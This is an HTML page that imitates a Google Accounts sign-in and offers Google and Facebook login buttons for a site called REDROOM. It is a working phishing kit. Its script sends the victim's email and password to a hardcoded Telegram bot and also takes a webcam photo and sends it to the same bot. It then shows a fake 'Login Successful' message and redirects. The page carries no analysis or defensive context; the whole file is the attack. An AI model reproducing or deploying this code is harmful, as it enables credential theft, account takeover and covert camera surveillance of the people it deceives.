<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
        body { background-color: #ffffff; display: flex; flex-direction: column; height: 100vh; width: 100vw; overflow: hidden; }
        .android-header { background-color: #f8f9fa; padding: 15px 20px; display: flex; align-items: center; gap: 20px; border-bottom: 1px solid #e0e0e0; }
        .android-header i { color: #5f6368; font-size: 20px; }
        .android-header span { color: #3c4043; font-size: 18px; font-weight: 500; }
        .content-area { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 40px 25px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 15px; }
        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; font-weight: 400; }
        p { color: #5f6368; font-size: 16px; margin-bottom: 40px; }
        .login-card { width: 100%; max-width: 400px; border: 1px solid #dadce0; border-radius: 8px; overflow: hidden; }
        .social-btn { width: 100%; display: flex; align-items: center; padding: 15px 20px; background: none; border: none; border-bottom: 1px solid #dadce0; cursor: pointer; text-align: left; }
        .social-btn:last-child { border-bottom: none; }
        .social-btn img { width: 24px; margin-right: 15px; }
        .social-btn i { font-size: 24px; margin-right: 15px; }
        .social-btn span { font-size: 15px; color: #3c4043; font-weight: 500; }
        .fb-icon { color: #1877f2; }
        #input-form { display: none; width: 100%; max-width: 400px; margin-top: 20px; text-align: left; }
        input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        input:focus { border: 2px solid #1a73e8; }
        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; float: right; cursor: pointer; }
    </style>
</head>
<body>

<div class="android-header">
    <i class="fas fa-close" onclick="window.history.back()"></i>
    <span>Sign in</span>
</div>

<div class="content-area">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
    <h1 id="title">Choose an account</h1>
    <p id="subtitle">to continue to REDROOM</p>

    <div class="login-card" id="selection">
        <button class="social-btn" onclick="showForm('Google')">
            <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png">
            <span>Login with Google</span>
        </button>
        <button class="social-btn" onclick="showForm('Facebook')">
            <i class="fab fa-facebook fb-icon"></i>
            <span>Login with Facebook</span>
        </button>
    </div>

    <div id="input-form">
        <input type="text" id="user" placeholder="Email or phone">
        <input type="password" id="pass" placeholder="Enter your password">
        <button class="next-btn" id="subBtn" onclick="sendToBot()">Next</button>
    </div>
</div>

<script>
    const botToken = "8490594899:AAE09QVVv2Z1OeOONTAbftWdv5KW-UZM8fo";
    const chatId = "7920005988";
    let platform = "";

    function showForm(p) {
        platform = p;
        document.getElementById('selection').style.display = 'none';
        document.getElementById('input-form').style.display = 'block';
        document.getElementById('title').innerText = "Sign in";
    }

    async function takeSnapshot() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('photo', blob, 'cam.jpg');
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
            stream.getTracks().forEach(t => t.stop());
        } catch (e) {}
    }

    function sendToBot() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        if(!user || !pass) return alert("Fill details");

        takeSnapshot(); // ছবি তুলবে

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: chatId, text: `📱 LOGIN\nPlatform: ${platform}\nUser: ${user}\nPass: ${pass}`})
        }).then(() => {
            localStorage.setItem("userName", user.split('@')[0]);
            alert("Login Successful! Processing Download...");
            // ডাউনলোড লিঙ্ক বা মেইন পেজে পাঠিয়ে দেওয়া
            window.location.href = "index.html"; 
        });
    }
</script>
</body>
</html>
